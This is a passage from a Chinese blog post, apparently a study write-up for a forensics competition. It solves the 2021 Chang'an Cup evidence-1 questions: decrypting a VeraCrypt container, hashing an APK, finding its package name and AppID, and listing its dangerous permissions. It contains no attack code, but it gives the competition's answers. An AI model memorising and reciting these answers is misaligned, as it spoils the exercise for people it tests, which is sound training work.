<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>电子数据取证刷题 | iyheart的博客</title><meta name="author" content="iyheart"><meta name="copyright" content="iyheart"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="备战美亚杯，故学习电子数据取证 使用工具美亚柏科开发的取证工具   总结  拿到附件先认真看检材对应的文件路径和取证所要回答的题目，记清楚多少题到多少题对应的是哪个检材的 然后将检材全部放入取证软件收集证据 将能做的先做掉，不要纠结，给自己每题限定个时间，找不到就接着往下，遇到自己不会的知识点直接全部跳，总之能拿到的分先拿到。做题踏踏实实的做，但是比赛要有技巧。 容器镜像先仿真一个，尽量仿真没有">
<meta property="og:type" content="article">
<meta property="og:title" content="电子数据取证刷题">
<meta property="og:url" content="http://iyheart.github.io/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/index.html">
<meta property="og:site_name" content="iyheart的博客">
<meta property="og:description" content="备战美亚杯，故学习电子数据取证 使用工具美亚柏科开发的取证工具   总结  拿到附件先认真看检材对应的文件路径和取证所要回答的题目，记清楚多少题到多少题对应的是哪个检材的 然后将检材全部放入取证软件收集证据 将能做的先做掉，不要纠结，给自己每题限定个时间，找不到就接着往下，遇到自己不会的知识点直接全部跳，总之能拿到的分先拿到。做题踏踏实实的做，但是比赛要有技巧。 容器镜像先仿真一个，尽量仿真没有">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/%E4%B8%8B%E8%BD%BD.png">
<meta property="article:published_time" content="2024-10-19T09:56:37.000Z">
<meta property="article:modified_time" content="2024-11-06T08:07:48.806Z">
<meta property="article:author" content="iyheart">
<meta property="article:tag" content="博客, 笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/%E4%B8%8B%E8%BD%BD.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://iyheart.github.io/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '电子数据取证刷题',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-06 16:07:48'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/styles.css"><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iyheart的博客" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">170</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">52</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/iyheart/tuchuang/main/img/下载.png')"><nav id="nav"><span id="blog-info"><a href="/" title="iyheart的博客"><img class="site-icon" src="http://img95.699pic.com/photo/40151/9175.gif_wh860.gif"/><span class="site-name">iyheart的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">电子数据取证刷题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-19T09:56:37.000Z" title="发表于 2024-10-19 17:56:37">2024-10-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-06T08:07:48.806Z" title="更新于 2024-11-06 16:07:48">2024-11-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">33.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>153分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="电子数据取证刷题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
<li>备战美亚杯，故学习电子数据取证</li>
<li>使用工具美亚柏科开发的取证工具</li>
</ul>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<ul>
<li>拿到附件先认真看检材对应的文件路径和取证所要回答的题目，记清楚多少题到多少题对应的是哪个检材的</li>
<li>然后将检材全部放入取证软件收集证据</li>
<li>将能做的先做掉，不要纠结，给自己每题限定个时间，找不到就接着往下，遇到自己不会的知识点直接全部跳，总之能拿到的分先拿到。做题踏踏实实的做，但是比赛要有技巧。</li>
<li>容器镜像先仿真一个，尽量仿真没有硬盘加密的镜像</li>
</ul>
<h1 id="2021第三届长安杯"><a class="markdownIt-Anchor" href="#2021第三届长安杯"></a> 2021第三届长安杯</h1>
<h2 id="检材1"><a class="markdownIt-Anchor" href="#检材1"></a> 检材1</h2>
<ul>
<li>题目背景：</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019180019274.png" alt="image-20241019180019274"></p>
<ul>
<li>
<p>使用工具发现检材1是由<code>veracrypt</code>加密，所以需要使用<code>veracrypt</code>进行解密。解密操作看如下。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.veracrypt.fr/en/Downloads.html">VeraCrypt - Free Open source disk encryption with strong security for the Paranoid</a><code>veracrypt</code>软件的下载网站</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.forensics-wiki.com/base/veracrypt/#_2">VeraCrypt使用方法 - Forensics-Wiki</a></p>
</li>
<li>
<p>先任意选一个要挂载的在电脑上的盘</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201236972.png" alt="image-20241019201236972"></p>
<ul>
<li>然后再选择文件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201251198.png" alt="image-20241019201251198"></p>
<ul>
<li>点击加载</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201324442.png" alt="image-20241019201324442"></p>
<ul>
<li>直接输入密码即可:<code>2021第三届CAB-changancup.com</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201414315.png" alt="image-20241019201414315"></p>
<ul>
<li>等加载好后就挂载到系统磁盘上了</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201449065.png" alt="image-20241019201449065"></p>
<ul>
<li>然后就会发现这里面有俩个文件，<code>检材二</code>和<code>检材一</code>所需要的<code>apk</code>文件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201513717.png" alt="image-20241019201513717"></p>
<ul>
<li>然后将这俩个文件提取出来，接下来就可以开始真正的取证了</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019201745523.png" alt="image-20241019201745523"></p>
<h3 id="题目1"><a class="markdownIt-Anchor" href="#题目1"></a> 题目1</h3>
<p><strong>请计算检材一Apk的SHA256值</strong></p>
<ul>
<li>这题使用<code>windows</code>自带的计算工具，在该文件目录下打开终端输入命令</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-hashfile</span> 检材一<span class="literal">-zhibo</span>.apk sha256</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>得到<code>has256</code>的值为<code>3fece1e93be4f422c8446b77b6863eb6a39f19d8fa71ff0250aac10f8bdde73a</code></p>
</li>
<li>
<p>这个<code>has256</code>值是对文件的内容（即文件的所有bit进行has256计算），计算出来的<code>has256</code>是唯一的，如果使用工具修改了这个文件里面的<code>1</code>字节，那么计算出来的<code>sha256</code>与原来不同。所以这个应该是用来标识文件有没被修改过，这个和apk应用里面的数字签名要区别开来，这是俩个不同概念的<code>sha256</code></p>
</li>
<li>
<p>使用火眼的<code>雷电app取证</code>，可以在这里得到答案</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020105725267.png" alt="image-20241020105725267"></p>
<h3 id="题目2"><a class="markdownIt-Anchor" href="#题目2"></a> 题目2</h3>
<p><strong>该APK的应用包名为</strong></p>
<ul>
<li>使用<code>jadx</code>进行逆向，找到该目录，该目录名即为APK的应用包名<code>plus.H5B8E45D3</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019215453806.png" alt="image-20241019215453806"></p>
<ul>
<li>使用<code>雷电app取证</code>可以直接得到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020105811814.png" alt="image-20241020105811814"></p>
<h3 id="题目3"><a class="markdownIt-Anchor" href="#题目3"></a> 题目3</h3>
<p><strong>该APK程序在封装服务商的应用唯一标识（APPID）为</strong></p>
<ul>
<li>在jadx逆向中找到<code>assets--&gt;data--&gt;dcloud_control.xml</code>，这样就可以看到<code>appid</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019221716077.png" alt="image-20241019221716077"></p>
<ul>
<li>也可以使用搜索，找到对应的<code>xml</code>文件就可以找到<code>appid</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241019221913244.png" alt="image-20241019221913244"></p>
<ul>
<li>使用<code>雷电app取证</code>可以直接得到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020105906065.png" alt="image-20241020105906065"></p>
<h3 id="题目4"><a class="markdownIt-Anchor" href="#题目4"></a> 题目4</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">该APK具备下列哪些危险权限(多选题)：</span><br><span class="line"></span><br><span class="line">A.读取短信</span><br><span class="line">B.读取通讯录</span><br><span class="line">C.读取精确位置</span><br><span class="line">D.修改通讯录</span><br><span class="line">E.修改短信</span><br></pre></td></tr></table></figure>
<ul>
<li>应用要获取的权限在该目录下<code>res(与assets同级目录)---&gt;AndroidManifest.xml</code>，该<code>.xml</code>文件里面的<code>uses-permission</code>就是该应用需要用户授权的权限使用</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">+ `READ_SMS`</span><br><span class="line">+ `READ_PHONE_STATE`</span><br><span class="line">+ `ACCESS_FINE_LOCATION`</span><br><span class="line">+ `WRITE_CONTACTS`</span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera.autofocus&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span>******</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span>*****</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SMS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.GET_ACCOUNTS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CONTACTS&quot;</span>/&gt;</span>****</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span>****</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_LOGS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.huawei.android.launcher.permission.CHANGE_BADGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.asus.msa.SupplementaryDID.ACCESS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里归纳一下这些选项获取的用户权限</li>
</ul>
<table>
<thead>
<tr>
<th>关键字（下面省去android.permission.）</th>
<th>对应权限</th>
</tr>
</thead>
<tbody>
<tr>
<td>android.permission.INTERNET（<strong>网络通讯</strong>）</td>
<td>允许应用使用网络连接（Wi-Fi、移动数据等）。</td>
</tr>
<tr>
<td>ACCESS_NETWORK_STATE</td>
<td>检查网络连接状态。</td>
</tr>
<tr>
<td>ACCESS_WIFI_STATE</td>
<td>检查 Wi-Fi 连接状态</td>
</tr>
<tr>
<td>CHANGE_WIFI_STATE</td>
<td>修改 Wi-Fi 连接状态。</td>
</tr>
<tr>
<td>READ_EXTERNAL_STORAGE（<strong>存储权限</strong>）</td>
<td>读取设备外部存储（SD卡等）的数据。</td>
</tr>
<tr>
<td>WRITE_EXTERNAL_STORAGE</td>
<td>写入数据到设备外部存储。</td>
</tr>
<tr>
<td>CALL_PHONE（<strong>电话与通讯</strong>）</td>
<td>直接拨打电话，不通过拨号界面。</td>
</tr>
<tr>
<td>READ_PHONE_STATE</td>
<td>访问设备状态，如电话的当前状态。</td>
</tr>
<tr>
<td>SEND_SMS</td>
<td>发送短信。</td>
</tr>
<tr>
<td>RECEIVE_SMS</td>
<td>接收短信。</td>
</tr>
<tr>
<td>READ_SMS</td>
<td>读取收到的短信。</td>
</tr>
<tr>
<td>WRITE_SMS</td>
<td>修改短信和彩信</td>
</tr>
<tr>
<td>ACCESS_FINE_LOCATION（<strong>位置信息</strong>）</td>
<td>获取精确位置信息（通过 GPS 或网络）。</td>
</tr>
<tr>
<td>ACCESS_COARSE_LOCATION</td>
<td>获取大致位置信息（通过 Wi-Fi 或移动基站）。</td>
</tr>
<tr>
<td>CAMERA（<strong>摄像头与多媒体</strong>）</td>
<td>访问设备摄像头。</td>
</tr>
<tr>
<td>RECORD_AUDIO</td>
<td>录制音频。</td>
</tr>
<tr>
<td>MODIFY_AUDIO_SETTINGS</td>
<td>修改音频设置，例如音量。</td>
</tr>
<tr>
<td>READ_CONTACTS（<strong>设备信息</strong>）</td>
<td>读取用户的联系人信息。</td>
</tr>
<tr>
<td>WRITE_CONTACTS</td>
<td>写入或修改用户的联系人信息。</td>
</tr>
<tr>
<td>GET_ACCOUNTS</td>
<td>访问用户的账户列表。</td>
</tr>
<tr>
<td>BLUETOOTH（<strong>传感器与设备控制</strong>）</td>
<td>访问蓝牙功能。</td>
</tr>
